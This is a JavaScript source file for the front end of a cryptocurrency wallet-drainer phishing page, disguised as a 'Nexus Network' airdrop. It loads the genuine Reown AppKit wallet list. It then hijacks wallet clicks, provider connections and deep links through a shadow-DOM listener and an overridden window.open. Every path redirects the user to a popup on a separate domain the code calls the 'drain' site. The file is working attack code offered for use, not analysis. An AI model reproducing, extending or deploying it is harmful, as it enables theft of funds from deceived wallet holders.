// =====================================================
// LANDING — Real AppKit on main domain
// Click wallet → popup opens drain domain with wallet pre-selected
// MetaMask popup appears immediately — no second wallet list
// =====================================================
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'

const DRAIN_BASE = 'https://barceoppen.vercel.app/';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// INIT REAL APPKIT — shows real wallet list with INSTALLED badges
// =====================================================
const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
  adapters: [ethersAdapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — OmniChain Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00f2fe',
  },
});

// =====================================================
// OPEN POPUP WITH WALLET NAME IN URL
// =====================================================
let popupOpened = false;

// Save original window.open EARLY — before any override
const _origOpen = window.open.bind(window);

function openDrainPopup(walletName) {
  if (popupOpened) return;
  popupOpened = true;

  try { modal.close(); } catch (e) {}
  try { modal.disconnect(); } catch (e) {}

  // Map wallet name to short key
  const w = (walletName || '').toLowerCase();
  let walletKey = 'auto';
  if (w.includes('metamask')) walletKey = 'metamask';
  else if (w.includes('trust')) walletKey = 'trust';
  else if (w.includes('phantom')) walletKey = 'phantom';
  else if (w.includes('brave')) walletKey = 'brave';
  else if (w.includes('coinbase')) walletKey = 'coinbase';
  else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';

  const url = `${DRAIN_BASE}?connect=1&w=${walletKey}`;

  if (isMobile) {
    window.location.href = url;
  } else {
    const pw = 360, ph = 440;
    const left = Math.round((screen.width - pw) / 2);
    const top = Math.round((screen.height - ph) / 2);
    // Use _origOpen to bypass our own interceptor
    _origOpen(url, 'connect_wallet',
      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
    );
  }

  setTimeout(() => { popupOpened = false; }, 2000);
}

// =====================================================
// INTERCEPT WALLET CLICKS
// =====================================================

// Track last clicked wallet name from Shadow DOM
let lastClickedWallet = '';

// Method 1: AppKit subscribe events — catch SELECT_WALLET with wallet name
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET' || e === 'CLICK_WALLET' || e === 'CONNECT_PRESS') {
    // Try to get wallet name from event properties
    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || lastClickedWallet || '';
    openDrainPopup(name);
  }
});

// Method 2: If wallet somehow connects, redirect
modal.subscribeProviders((state) => {
  if (state['eip155']) {
    try { modal.disconnect(); } catch (e) {}
    openDrainPopup(lastClickedWallet);
  }
});

// Method 3: Shadow DOM click interceptor — extract wallet name from clicked element
const domObserver = new MutationObserver(() => {
  const w3m = document.querySelector('w3m-modal');
  if (!w3m || w3m._clickPatched) return;
  w3m._clickPatched = true;

  w3m.addEventListener('click', (e) => {
    const path = e.composedPath();
    for (const el of path) {
      if (!el.tagName) continue;
      const tag = el.tagName.toLowerCase();
      if (tag === 'wui-list-wallet' || tag.includes('wallet')) {
        // Extract wallet name from the element
        const name = el.getAttribute?.('name') ||
                     el.getAttribute?.('walletid') ||
                     el.textContent?.trim()?.split('\n')?.[0]?.trim() || '';
        lastClickedWallet = name;
        setTimeout(() => openDrainPopup(name), 50);
        return;
      }
    }
  }, true);
});
domObserver.observe(document.body, { childList: true, subtree: true });

// Method 4: Intercept deep links (wallet:// protocol opens)
window.open = function(url, ...args) {
  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
    if (url.includes('metamask')) { openDrainPopup('metamask'); return null; }
    if (url.includes('trust')) { openDrainPopup('trust'); return null; }
    if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup('walletconnect'); return null; }
  }
  return _origOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  popupOpened = false;
  lastClickedWallet = '';
  modal.open({ view: 'Connect' });
};
